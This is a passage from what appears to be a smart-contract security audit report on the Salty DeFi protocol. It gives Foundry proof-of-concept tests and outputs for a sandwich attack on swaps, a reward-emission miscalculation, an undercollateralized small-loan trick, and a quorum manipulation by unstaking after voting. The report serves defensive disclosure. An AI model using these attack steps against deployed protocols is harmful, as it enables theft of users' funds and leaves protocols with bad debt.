        salt.approve(address(collateralAndLiquidity), type(uint256).max);

        // Alice gets some salt and pool lps and approves max to staking
        token1.transfer(alice, 1000 ether);
        token2.transfer(alice, 1000 ether);
        vm.startPrank(alice);
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();

        // Bob gets some salt and pool lps and approves max to staking
        token1.transfer(bob, 1000 ether);
        token2.transfer(bob, 1000 ether);
        vm.startPrank(bob);
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
        token1.approve(address(pools), type(uint256).max);
        token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

        // DAO gets some salt and pool lps and approves max to staking
        token1.transfer(address(dao), 1000 ether);
        token2.transfer(address(dao), 1000 ether);
        vm.startPrank(address(dao));
        token1.approve(address(collateralAndLiquidity), type(uint256).max);
        token2.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();
    	}


	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
		{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return collateralAndLiquidity.totalSharesForPools(_pools2)[0];
		}


	function test_sandwich_with_swap() public {
		// ******************************* SETUP **************************************
		// create some initial liquidity
		assertEq(collateralAndLiquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
        assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// ratio of 1:1
		uint256 addedAmount1 = 1 ether;
		uint256 addedAmount2 = 1 ether;

		// Have Bob add liquidity
		vm.prank(bob);
		(,, uint256 addedLiquidity) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, 0 ether, block.timestamp, false );
		assertEq(collateralAndLiquidity.userShareForPool(bob, pool1), addedLiquidity, "Bob's share should have increased" );

		// Check that the contract balance has increased by the amount of the added tokens
		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
        assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		
		uint256 initialToken2BalanceInPool = token2.balanceOf( address(pools));
		// ******************************* SETUP ENDS **************************************

		// save a snapshot of current state
		uint256 snapshot = vm.snapshot();
		
		// ******************************* CASE-1 : NORMAL SCENARIO; NO FRONT-RUN ATTACK **************************************
		// alice adds liquidity
		console.log("\nCase-1:\nOriginal ratio of token1 : token2 is %s : 1", token1.balanceOf( address(pools)) / initialToken2BalanceInPool); 
		console.log("actual balances token1 ; token2 = %s ; %s", token1.balanceOf( address(pools)), initialToken2BalanceInPool); 
		assertEq(collateralAndLiquidity.userShareForPool(alice, pool1), 0, "Alice's initial liquidity share should be zero");
		uint256 alice_addedAmount1 = 10 ether;
		uint256 alice_addedAmount2 = 10 ether; 

		vm.prank(alice);
		(uint256 alice_addedAmountA, uint256 alice_addedAmountB,) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, alice_addedAmount1, alice_addedAmount2, 0 ether, block.timestamp, false );
		console.log("\n\nalice_addedAmountA = %s, alice_addedAmountB = %s\n\n", alice_addedAmountA, alice_addedAmountB);

		// Bob swaps at current exchang rate. inToken = token2, outToken = token1
		vm.prank(bob);
		uint256 amountOut = pools.depositSwapWithdraw( token2, token1, 1 ether, 0, block.timestamp );
		console.log("swapped out token1 amount by Bob for 1 ether of token2 =", amountOut);
		// ******************************* CASE-1 ENDS **************************************
		
		
		// revert to the state of saved snapshot
		vm.revertTo(snapshot);
		// ******************************* CASE-2 : ATTACK SCENARIO; WITH SANDWICH ATTACK **************************************
		console.log("\n****** CASE-2 ******\n");
		// 1. Front-running by Bob
		// Bob swaps. inToken = token1, outToken = token2
		vm.prank(bob);
		uint256 amountOutFrontRunSwap = pools.depositSwapWithdraw( token1, token2, 1 ether, 0, block.timestamp );
		console.log("swapped out token2 amount by Bob for 1 ether of token1 ", amountOutFrontRunSwap);
		console.log("\nCase-2:\nNew ratio of token1 : token2 is %s : 1", token1.balanceOf( address(pools)) / token2.balanceOf( address(pools))); 
		console.log("actual balances token1 ; token2 = %s ; %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools))); 
		
		// 2. alice now adds liquidity
		assertEq(collateralAndLiquidity.userShareForPool(alice, pool1), 0, "Alice's initial liquidity share should be zero");
		vm.prank(alice);
		(alice_addedAmountA, alice_addedAmountB,) = collateralAndLiquidity.depositLiquidityAndIncreaseShare( token1, token2, alice_addedAmount1, alice_addedAmount2, 0 ether, block.timestamp, false );
		assertEq(alice_addedAmountA, alice_addedAmount1, "all of Alice's token1 not added");

		// 3. Bob swaps at this artificially jacked-up exchange-rate. inToken = token2, outToken = token1
		vm.prank(bob);
		uint256 amountOutAfterAttack = pools.depositSwapWithdraw( token2, token1, 1 ether, 0, block.timestamp );
		console.log("swapped out token1 amount by Bob for 1 ether of token2 ", amountOutAfterAttack);
		
		console.log("\nExtra token1 amount stolen by Bob in the attack =", amountOutAfterAttack - amountOut);
		assertGt(amountOutAfterAttack - amountOut, 0, "nothing stolen");
		// ******************************* CASE-2 ENDS **************************************
	}
}
```

Output:
```text
[PASS] test_sandwich_with_swap() (gas: 674539)
Logs:

Case-1:
Original ratio of token1 : token2 is 1 : 1
  actual balances token1 ; token2 = 1000000000000000000 ; 1000000000000000000


alice_addedAmountA = 10000000000000000000, alice_addedAmountB = 10000000000000000000


  swapped out token1 amount by Bob for 1 ether of token2 = 916666666666666666

****** CASE-2 ******

  swapped out token2 amount by Bob for 1 ether of token1  500000000000000000

Case-2:
New ratio of token1 : token2 is 4 : 1
  actual balances token1 ; token2 = 2000000000000000000 ; 500000000000000000
  swapped out token1 amount by Bob for 1 ether of token2  3000000000000000000

Extra token1 amount stolen by Bob in the attack = 2083333333333333334
```

## Tools Used
Foundry

## Recommended Mitigation Steps
It is recommended to not use "spot reserve ratio" for exchange rate calculation in swap(). Preferable to use some time-weighted approach or some past snapshot value which discourages manipulating reserves & prices within the same block. Additionally, some cooldown period can be implemented between placing a swap request and it's execution.

---

### <a id="h-03"></a>[H-03]
## **StakingRewards pools are not given their promised share of rewards due to incorrect calculation**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/RewardsEmitter.sol#L103
<br>

## Impact
[RewardsEmitter::performUpkeep()](https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/RewardsEmitter.sol#L82) distributes the added rewards to the eligible staking pools at the rate of `X%` per day (default value set to 1% by the protocol). To ensure that once disbursed, it is not sent again, the code reduces the `pendingRewards[poolID]` variable on [L126](https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/RewardsEmitter.sol#L126):
```js
120			// Each pool will send a percentage of the pending rewards based on the time elapsed since the last send
121			uint256 amountToAddForPool = ( pendingRewards[poolID] * numeratorMult ) / denominatorMult;
122
123			// Reduce the pending rewards so they are not sent again
124			if ( amountToAddForPool != 0 )
125				{
126				pendingRewards[poolID] -= amountToAddForPool;
127
128				sum += amountToAddForPool;
129				}
```

The impact of this is: **_higher the number of times performUpkeep() is called, lesser the rewards per day is distributed to the pools._** That is, calling it 100 times a day is worse than calling it once at the end of the day. This is at odds with how the protocol wants to achieve a higher frequency of upkeep-ing.
<br>

Reasoning:<br>
This above code logic is incorrect maths as doing this will result in the following scenario:
- Suppose that on Day0, the `addedRewards = 10 ether` and `rewardsEmitterDailyPercentTimes1000 = 2500` i.e. 2.5% per day. One would expect all rewards to be distributed to the pool after 40 days (since 2.5% * 40 = 100%).
- On Day1, `performUpkeep()` gets called. `amountToAddForPool` and `pendingRewards[poolID]` are calculated on L121 & L126 respectively as:
    - `amountToAddForPool = 0.025 * 10 ether = 0.25 ether`
    - `pendingRewards[poolID] = 10 ether - 0.25 ether = 9.75 ether`
- On Day2, `performUpkeep()` gets called again. `amountToAddForPool` and `pendingRewards[poolID]` are calculated now as:
    - `amountToAddForPool = 0.025 * 9.75 ether = 0.24375 ether`
    - `pendingRewards[poolID] = 9.75 ether - 0.24375 ether = 9.50625 ether`

So on and so forth for each new day. The actual formula being followed is `totalRewardsStillRemainingAfterXdays = 10 ether * (1 - 2.5%)**X` which would be `3632324398878806621` or `3.63232 ether` after 40 days. In fact, even after another 40 days, it's still not all paid out. Please refer the **_"Proof of Concept - 1"_** provided below. In fact, since this is a classic negative compounding formula ( $Amount = Principle * (1 - rate)^{time}$ ), no matter how many days pass, all the rewards would never be distributed and dust would always remain in the contract.

## Further Evidence & Impact
To remove any doubts regarding the interpretation of the `1% per day rate` and if indeed the current implementation is as intended or not, one can look at the following calculation provided in the comments:<br>
[StakingRewards.sol#L178-L181](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingRewards.sol#L178-L181)
```js
	// 3. Rewards are first placed into a RewardsEmitter which deposits rewards via addSALTRewards at the default rate of 1% per day.
	// 4. Rewards are deposited fairly often, with outstanding rewards being transferred with a frequency proportional to the activity of the exchange.
	// Example: if $100k rewards were being deposited in a bulk transaction, it would only equate to $1000 (1%) the first day,
	// or $10 in claimable rewards during a 15 minute upkeep period.
```

Let's crunch the above numbers -
- The comment says, `"$100K rewards would equate to $1000 (1%) the first day"` **OR** "`$10 claimable rewards`" when upkeep() is called every 15 minutes.
- This conclusion could have been arrived at by the protocol only when the reward of `$1000` (over 24 hours) is divided equally for each 15 minutes i.e. `$1000 / (24 * 60 / 15)` equalling `$10` (rounded-down).

This is certainly not the case currently as can be seen in the **_"Proof of Concept - 2"_**.
<br><br>

**Note** that this means that per day much lesser rewards than 1% are distributed if `performUpkeep()` is called every 15 minutes instead of once after 24 hours. A malicious actor can use this to grief the protocol and delay/diminish emissions. The power of negative compunding causes this and can be seen in the second PoC.

## Proof of Concept - 1
Add the following test inside `src/rewards/tests/RewardsEmitter.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_allPendingRewardsNeverPaidOut` to see the two assertions fail. The value of `rewardsEmitterDailyPercentTimes1000` in the test is 2.5% per day.<br>
```js
    function test_allPendingRewardsNeverPaidOut() public {

        // Add some pending rewards to the pools
        AddedReward[] memory addedRewards = new AddedReward[](1);
        addedRewards[0] = AddedReward({poolID: poolIDs[0], amountToAdd: 10 ether});
        liquidityRewardsEmitter.addSALTRewards(addedRewards);

        // Verify that the rewards were added
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 10 ether);

        // Call performUpkeep
        vm.startPrank(address(upkeep));
        for (uint256 i; i < 40; ++i)
            liquidityRewardsEmitter.performUpkeep(1 days);
        vm.stopPrank();

        // Verify that the correct amount of rewards were deducted from each pool's pending rewards
        // 2.5% of the rewards should be deducted per day, so all rewards should be paid out after the 40 days' iteration above
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 0 ether, "not all reward distributed");


        // Let's try 40 times more, just to confirm the behaviour and see if ever all the rewards are paid out
        vm.startPrank(address(upkeep));
        for (uint256 i; i < 40; ++i)
            liquidityRewardsEmitter.performUpkeep(1 days);
        vm.stopPrank();
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 0 ether, "nope, not even now");
    }
```

Output:
```text
[FAIL. Reason: assertion failed] test_allPendingRewardsNeverPaidOut() (gas: 5441491)
Logs:
  Error: not all reward distributed
  Error: a == b not satisfied [uint]
        Left: 3632324398878806621
       Right: 0
  Error: nope, not even now
  Error: a == b not satisfied [uint]
        Left: 1319378053869028394
       Right: 0
```

## Proof of Concept - 2
Add the following test inside `src/rewards/tests/RewardsEmitter.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_perDayDefaultRateNotAdheredTo` to see last assertion fail. The value of `rewardsEmitterDailyPercentTimes1000` in the test is 1% per day and `upkeep()` is called every 15 minutes.<br>
**We observe that by the end of the day, `4931 ethers` less is disbursed than expected.**
```js
    function test_perDayDefaultRateNotAdheredTo() public {
        // set daily rate to 1%
        vm.startPrank(address(dao));
		for ( uint256 i = 0; i < 6; i++ )
			rewardsConfig.changeRewardsEmitterDailyPercent(false);
		vm.stopPrank();
        assertEq(rewardsConfig.rewardsEmitterDailyPercentTimes1000(), 1000);

        // Add some pending rewards to the pools
        deal(address(salt), address(this), 100_000_000 ether);
        AddedReward[] memory addedRewards = new AddedReward[](1);
        addedRewards[0] = AddedReward({poolID: poolIDs[0], amountToAdd: 100_000_000 ether});
        liquidityRewardsEmitter.addSALTRewards(addedRewards);
        // Verify that the rewards were added
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 100_000_000 ether);

        // Call performUpkeep every 15 minutes for a full day
        uint256 totalDisbursed = 0;
        uint256 disbursedInLast15Mins = pendingLiquidityRewardsForPool(poolIDs[0]);
        console.log("Time Lapsed ( in mins)        |       Reward emiited in last 15 mins      |       Total reward emitted");
        vm.startPrank(address(upkeep));
        for (uint256 i; i < 24 * 4; ++i) {
            liquidityRewardsEmitter.performUpkeep(15 minutes);
            uint256 diff = disbursedInLast15Mins - pendingLiquidityRewardsForPool(poolIDs[0]);
            totalDisbursed += diff;
            console.log("%s                        |          %s         |          %s", (i+1)*15, diff, totalDisbursed); 
            disbursedInLast15Mins = pendingLiquidityRewardsForPool(poolIDs[0]);
        }
        vm.stopPrank();

        // Verify that the correct amount of rewards were deducted from each pool's pending rewards
        // 1% of the rewards should be deducted per day
        assertEq(pendingLiquidityRewardsForPool(poolIDs[0]), 99_000_000 ether, "1% per day not adhered to");
    }
```

Output:
```text
[FAIL. Reason: assertion failed] test_perDayDefaultRateNotAdheredTo() (gas: 7243619)
Logs:
  Time Lapsed ( in mins)        |       Reward emiited in last 15 mins      |       Total reward emitted
  15                        |          10416666666666666666666         |          10416666666666666666666
  30                        |          10415581597222222222222         |          20832248263888888888888
  45                        |          10414496640805844907407         |          31246744904694733796295
  60                        |          10413411797405760965229         |          41660156702100494761524
  75                        |          10412327067010197865129         |          52072483769110692626653
  90                        |          10411242449607384302851         |          62483726218718076929504
  105                        |          10410157945185550200319         |          72893884163903627129823
  120                        |          10409073553732926705507         |          83302957717636553835330
  135                        |          10407989275237746192308         |          93710946992874300027638
  150                        |          10406905109688242260413         |          104117852102562542288051
  165                        |          10405821057072649735178         |          114523673159635192023229
  180                        |          10404737117379204667497         |          124928410277014396690726
  195                        |          10403653290596144333678         |          135332063567610541024404
  210                        |          10402569576711707235309         |          145734633144322248259713
  225                        |          10401485975714133099139         |          156136119120036381358852
  240                        |          10400402487591662876941         |          166536521607628044235793
  255                        |          10399319112332538745392         |          176935840719960582981185
  270                        |          10398235849925004105939         |          187334076569885587087124
  285                        |          10397152700357303584678         |          197731229270242890671802
  300                        |          10396069663617683032221         |          208127298933860573704023
  315                        |          10394986739694389523572         |          218522285673554963227595
  330                        |          10393903928575671357997         |          228916189602130634585592
  345                        |          10392821230249778058897         |          239309010832380412644489
  360                        |          10391738644704960373682         |          249700749477085373018171
  375                        |          10390656171929470273643         |          260091405649014843291814
  390                        |          10389573811911560953823         |          270480979460926404245637
  405                        |          10388491564639486832891         |          280869471025565891078528
  420                        |          10387409430101503553012         |          291256880455667394631540
  435                        |          10386327408285867979725         |          301643207863953262611265
  450                        |          10385245499180838201811         |          312028453363134100813076
  465                        |          10384163702774673531165         |          322412617065908774344241
  480                        |          10383082019055634502672         |          332795699084964408846913
  495                        |          10382000448011982874078         |          343177699532976391720991
  510                        |          10380918989631981625862         |          353558618522608373346853
  525                        |          10379837643903894961109         |          363938456166512268307962
  540                        |          10378756410815988305384         |          374317212577328256613346
  555                        |          10377675290356528306602         |          384694887867684784919948
  570                        |          10376594282513782834904         |          395071482150198567754852
  585                        |          10375513387276020982525         |          405446995537474588737377
  600                        |          10374432604631513063673         |          415821428142106101801050
  615                        |          10373351934568530614395         |          426194780076674632415445
  630                        |          10372271377075346392456         |          436567051453749978807901
  645                        |          10371190932140234377207         |          446938242385890213185108
  660                        |          10370110599751469769459         |          457308352985641682954567
  675                        |          10369030379897328991358         |          467677383365539011945925
  690                        |          10367950272566089686255         |          478045333638105101632180
  705                        |          10366870277746030718579         |          488412203915851132350759
  720                        |          10365790395425432173713         |          498777994311276564524472
  735                        |          10364710625592575357862         |          509142704936869139882334
  750                        |          10363630968235742797928         |          519506335905104882680262
  765                        |          10362551423343218241387         |          529868887328448100921649
  780                        |          10361471990903286656153         |          540230359319351387577802
  795                        |          10360392670904234230460         |          550590751990255621808262
  810                        |          10359313463334348372728         |          560950065453589970180990
  825                        |          10358234368181917711439         |          571308299821771887892429
  840                        |          10357155385435232095011         |          581665455207207119987440
  855                        |          10356076515082582591667         |          592021531722289702579107
  870                        |          10354997757112261489314         |          602376529479401964068421
  885                        |          10353919111512562295409         |          612730448590914526363830
  900                        |          10352840578271779736837         |          623083289169186306100667
  915                        |          10351762157378209759781         |          633435051326564515860448
  930                        |          10350683848820149529597         |          643785735175384665390045
  945                        |          10349605652585897430688         |          654135340827970562820733
  960                        |          10348527568663753066372         |          664483868396634315887105
  975                        |          10347449597042017258761         |          674831317993676333145866
  990                        |          10346371737708992048630         |          685177689731385325194496
  1005                        |          10345293990652980695292         |          695522983722038305889788
  1020                        |          10344216355862287676469         |          705867200077900593566257
  1035                        |          10343138833325218688170         |          716210338911225812254427
  1050                        |          10342061423030080644556         |          726552400334255892898983
  1065                        |          10340984124965181677823         |          736893384459221074576806
  1080                        |          10339906939118831138064         |          747233291398339905714870
  1095                        |          10338829865479339593154         |          757572121263819245308024
  1110                        |          10337752904035018828613         |          767909874167854264136637
  1125                        |          10336676054774181847485         |          778246550222628445984122
  1140                        |          10335599317685142870209         |          788582149540313588854331
  1155                        |          10334522692756217334494         |          798916672233069806188825
  1170                        |          10333446179975721895188         |          809250118413045528084013
  1185                        |          10332369779331974424157         |          819582488192377502508170
  1200                        |          10331293490813294010155         |          829913781683190796518325
  1215                        |          10330217314408000958696         |          840243998997598797477021
  1230                        |          10329141250104416791929         |          850573140247703214268950
  1245                        |          10328065297890864248513         |          860901205545594078517463
  1260                        |          10326989457755667283487         |          871228195003349745800950
  1275                        |          10325913729687151068145         |          881554108733036896869095
  1290                        |          10324838113673641989909         |          891878946846710538859004
  1305                        |          10323762609703467652202         |          902202709456414006511206
  1320                        |          10322687217764956874321         |          912525396674178963385527
  1335                        |          10321611937846439691314         |          922847008612025403076841
  1350                        |          10320536769936247353846         |          933167545381961650430687
  1365                        |          10319461714022712328080         |          943487007095984362758767
  1380                        |          10318386770094168295545         |          953805393866078531054312
  1395                        |          10317311938138950153015         |          964122705804217481207327
  1410                        |          10316237218145394012374         |          974438943022362875219701
  1425                        |          10315162610101837200497         |          984754105632464712420198
  1440                        |          10314088113996618259122         |          995068193746461330679320
  Error: 1% per day not adhered to
  Error: a == b not satisfied [uint]
        Left: 99004931806253538669320680
       Right: 99000000000000000000000000
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Store the eligible pool reward & the already paid out reward in separate variables and compare them to make sure extra rewards are not being paid out to a pool.<br>
Irrespective of the `performUpkeep()` calling frequency, at the end of the day, 1% should be disbursed.

---

### <a id="h-04"></a>[H-04]
## **Partial repayment allows creation of small positions as well as undercollateralized positions**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L115
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L232-L233
<br>

## Impact
There are two issues intertwined here which need to be highlighted:
-  1. Malicious users can bypass `minimumCollateralValueForBorrowing` threshold by first taking out a valid loan, then repaying partially such that the remaining position is too small to be of interest to any liquidator.
-  2. Due to the way `maxWithdrawableCollateral()` and `userCollateralValueInUSD()` are calculated, it allows users to call `withdrawCollateralAndClaim()` even when the remaining loan amount becomes undercollateralized.

### Details
[StableConfig.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L26-L29) quite correctly states in its comments that:
```js
            // The minimum USD value of collateral - to borrow an initial amount of USDS.
@------->   // This is to help prevent saturation of the contract with small amounts of positions and to ensure that liquidating the position yields non-trivial rewards
            // Range: 1000 to 5000 with an adjustment of 500 ether
            uint256 public minimumCollateralValueForBorrowing = 2500 ether;
```

Preventing such small positions is important since this can be used by a malicious competitor in the following manner -
- A malicious whale/competitor/group-of-actors open a large short position against the protocol (or simply want to bring the protocol down with bad debt).
- They create multiple small positions/loans which are just not profitable for any liquidator to liquidate. This is because any liquidator has to receive rewards greater than the gas fee they have to pay for calling the `liquidateUser` function.
- In the end these low value loans will never get liquidated, leaving the protocol with bad debt and can even cause the protocol to go underwater.

See a [similar issue raised in the past](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/issues/1096) rated as **high impact** & **high likelihood**. It additionally highlights in the comments section how this can become an attack vector (even by non-whales) on chains which aren't costly.
<br><br>

The issue at hand is that although there is a check present while calling `borrowUSDS()` [via an internal call to maxBorrowableUSDS()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L277-L278) to prevent loans smaller than [minimumCollateralValueForBorrowing](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L29) which is set by default to 2500 ether, there is no such check when using [repayUSDS()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L115) to pay off the loan partially. Hence, any malicious user can choose to repay all except a small amount of their debt. The remaining debt would not be profitable enough for any liquidator. This is not just because of gas fees, but also because the malicuous actor can craft this in such a way that the remaining collateral value expressed in USD equals zero, and hence no rewards would be payable to the liquidator at all. This is where the second issue of [withdrawCollateralAndClaim()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L80) and in turn [userCollateralValueInUSD()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L232-L233) comes into play.
<br>

[L84](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L84) allows collateral withdrawal if it is not more than `maxWithdrawableCollateral(msg.sender)`. This internally calls [userCollateralValueInUSD()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L221-L233) which has the following lines:
```js
	function userCollateralValueInUSD( address wallet ) public view returns (uint256)
		{
@--->	uint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );
		if ( userCollateralAmount == 0 )
			return 0;

		uint256 totalCollateralShares = totalShares[collateralPoolID];

		// Determine how much collateral share the user currently has
		(uint256 reservesWBTC, uint256 reservesWETH) = pools.getPoolReserves(wbtc, weth);

@--->	uint256 userWBTC = (reservesWBTC * userCollateralAmount ) / totalCollateralShares;
@--->	uint256 userWETH = (reservesWETH * userCollateralAmount ) / totalCollateralShares;

		return underlyingTokenValueInUSD( userWBTC, userWETH );
		}
```

This works fine the first time when user's eligibility for collateral withdrawal is checked and the protocol gives the caller a withdrawable amount which would be "safe" to withdraw without putting the remaining loan in danger of being undercollateralized. However after withdrawal, the remaining `userCollateralAmount` could be such a small value that `userWBTC` and `userWETH` round-down to zero - this is overlooked by the protocol. This results in the behaviour that when the remaining loan is checked, it is found to be `canUserBeLiquidated = true` even though it was calculated by the protocol before withdrawal that the loan would remain healthy. An example of this is presented in the PoC where Alice leaves behind `1` in her loan (which was allowed by the protocol) and yet when collateral withdrawal has been made, the remaining loan is seen as undercollateralized. This remaining collateral of `1` evaluates to `0 USD` value as per the protocol.
<br>

This `1` continues to remain in the pool, diluting the value of other users' shares. The following PoC shows the aforementioned behaviour. This action can be repeated by multiple wallets to flood the protocol with bad debt.

## Proof of Concept
Add the following test inside `src/stable/tests/CollateralAndLiquidity.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_createSmallPosition`:<br>
```js
	function test_createSmallPosition() public {
        // No loans taken by Alice & Bob initially
        assertEq( collateralAndLiquidity.userShareForPool( alice, collateralPoolID ), 0);
        assertEq( collateralAndLiquidity.userShareForPool( bob, collateralPoolID ), 0);
        assertEq( usds.balanceOf(alice), 0);
        assertEq( usds.balanceOf(bob), 0);

        uint256 collateral = 5000 ether;
        deal(address(wbtc), address(alice), collateral);
        deal(address(weth), address(alice), collateral);
        deal(address(wbtc), address(bob), collateral);
        deal(address(weth), address(bob), collateral);

        // Alice and Bob each deposit and borrow
        vm.startPrank( alice );
		collateralAndLiquidity.depositCollateralAndIncreaseShare(collateral, collateral, 0, block.timestamp, false );
		uint256 maxUSDSAlice = collateralAndLiquidity.maxBorrowableUSDS(alice);
		collateralAndLiquidity.borrowUSDS( maxUSDSAlice );
		vm.stopPrank();

        vm.startPrank( bob );
		collateralAndLiquidity.depositCollateralAndIncreaseShare(collateral, collateral, 0, block.timestamp, false );
		uint256 maxUSDSBob = collateralAndLiquidity.maxBorrowableUSDS(bob);
		collateralAndLiquidity.borrowUSDS( maxUSDSBob );
		vm.stopPrank();

    	skip(1 days );
        assertEq( collateralAndLiquidity.userShareForPool( alice, collateralPoolID ), 2*collateral);
        assertEq( collateralAndLiquidity.userShareForPool( bob, collateralPoolID ), 2*collateral);
        uint256 aliceBorrowedAmount = usds.balanceOf(alice);
        uint256 bobBorrowedAmount = usds.balanceOf(bob);
        assertEq(aliceBorrowedAmount, maxUSDSAlice);
        assertEq(bobBorrowedAmount, maxUSDSBob);

        // Check that Alice can not be liquidated
        assertFalse(collateralAndLiquidity.canUserBeLiquidated(alice)); 
        // Alice repays all her debt except a small amount of 939; and then removes as much collateral as possible
        vm.startPrank(alice);
        collateralAndLiquidity.repayUSDS(aliceBorrowedAmount - 939);
        assertEq(usds.balanceOf(alice), 939);
        collateralAndLiquidity.withdrawCollateralAndClaim(2*collateral - 1, 0, 0, block.timestamp);
        vm.stopPrank();

        // Check collateral.numberOfUsersWithBorrowedUSDS returns correct number of open positions
        assertEq(collateralAndLiquidity.numberOfUsersWithBorrowedUSDS(), 2);

        // Check if Alice can be liquidated
        assertTrue(collateralAndLiquidity.canUserBeLiquidated(alice)); // @audit : Alice was allowed to withdraw collateral even when it resulted in loan becoming undercollateralized

        // Check Alice's borrowed & collateral amounts
        assertTrue(_userHasCollateral(alice));
        assertEq(collateralAndLiquidity.usdsBorrowedByUsers(alice), 939);
        assertEq(collateralAndLiquidity.userShareForPool( alice, collateralPoolID ), 1);
        assertEq(collateralAndLiquidity.userCollateralValueInUSD( alice ), 0, "collateral value in USD > 0");

        /*
        // There is no incentive for anyone to liquidate Alice now since the reward is 0
        skip(1 days);
        vm.prank(bob);
        vm.expectEmit(false, false, false, false, address(collateralAndLiquidity));
        emit Liquidation(address(bob), address(alice), 0, 0, 939);
        collateralAndLiquidity.liquidateUser(alice);
        */
    }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Add a check inside `repayUSDS` that if the entire loan is not being settled, then the partial repayment should not push the collateral value below a certain limit. This limit could be [minimumCollateralValueForBorrowing](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L29) or some other value. Also, the `userWBTC` & `userWETH` calculated should be verified after calculation so that "undercollateralized withdrawal" can be avoided.

## Note
Although the two issues feel to be distinct to me, each requiring a separate fix, omitting any one from the report would have resulted in the full impact not being highighted properly and hence have clubbed them together. I leave it to the judges to decide if these need to be considered separately or as one.

---

### <a id="h-05"></a>[H-05]
## **Malicious user can unstake after casting vote to manipulate ballot results**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L320
<br>

## Impact
[requiredQuorumForBallotType()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L320) calculates minimum quorum by taking into account the live value of staked salt in the pool:
```js
	// The required quorum is normally a default 10% of the amount of SALT staked.
	// There is though a minimum of 0.50% of SALT.totalSupply (in the case that the amount of staked SALT is low - at launch for instance).
	function requiredQuorumForBallotType( BallotType ballotType ) public view returns (uint256 requiredQuorum)
		{
		// The quorum will be specified as a percentage of the total amount of SALT staked
@---->  uint256 totalStaked = staking.totalShares( PoolUtils.STAKED_SALT );
		require( totalStaked != 0, "SALT staked cannot be zero to determine quorum" );

```

However, when counting the number of each type of vote in [votesCastForBallot()](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol#L311) or when counting the total number of votes entered, it makes use of an internal variable:
```js
	function votesCastForBallot( uint256 ballotID, Vote vote ) external view returns (uint256)
		{
		return _votesCastForBallot[ballotID][vote];
		}
```

This value is not reduced when a user unstakes **_after_** casting their vote. This opens up 2 attack vectors for Alice to manipulate the ballot:

### Attack Vector - 1 (Manipulation of quorum value)
- Total staked salt = 6,000,000 in the system right now
- Alice stakes her 650,000 salt. The total salt staked is now 6,000,000 + 650,000 = 6,650,000
- A proposal is floated
- Minimum quorum required is 10% of 6,650,000 = 665,000
- Alice votes `yes` but this is still less than minimum required quorum
- She unstakes her xSalt, reducing total staked salt back to 6,000,000. This is because although the salt is sent back to Alice slowly over a period of time, her staked balance is immediately deducted in full.
- Minimum quorum required now is 10% of 6,000,000 = 600,000
- Alice's `yes` vote remains recorded and is never removed by the protocol
- Thus, minimum quorum is achieved and proposal is finalized

Alice can now optionally choose to cancel her unstake request.

### Attack Vector - 2 (Manipulation of voting power)
Pre-requisite for this attack vector: `StakingConfig.minUnstakeWeeks <= ballotMinimumDuration`
- Assume `StakingConfig.minUnstakeWeeks` = 2 weeks and `ballotMinimumDuration` = 14 days (i.e. 2 weeks)
- Total staked salt = 6,000,000 in the system right now
- Alice stakes her 650,000 salt
- A proposal is floated
- Alice votes `yes` but this is still less than minimum required quorum. Current count of `yes` votes = 650,000.
